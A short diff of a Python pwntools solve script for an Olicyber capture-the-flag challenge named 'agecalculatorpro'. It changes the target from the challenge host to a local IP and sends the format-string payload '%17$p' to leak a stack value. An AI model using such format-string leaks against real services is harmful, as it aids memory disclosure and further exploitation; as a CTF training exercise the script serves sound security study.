@@ -2,7 +2,7 @@ from pwn import *
 from Crypto.Util.number import bytes_to_long
 
 #r = remote("agecalculatorpro.challs.territoriale.olicyber.it", 38103)
-r = remote("agecalculatorpro.challs.olicyber.it", 38103)
+r = remote("192.168.100.3", 38103)
 
 r.recvuntil(b"?\n")
 r.sendline(b"%17$p") 
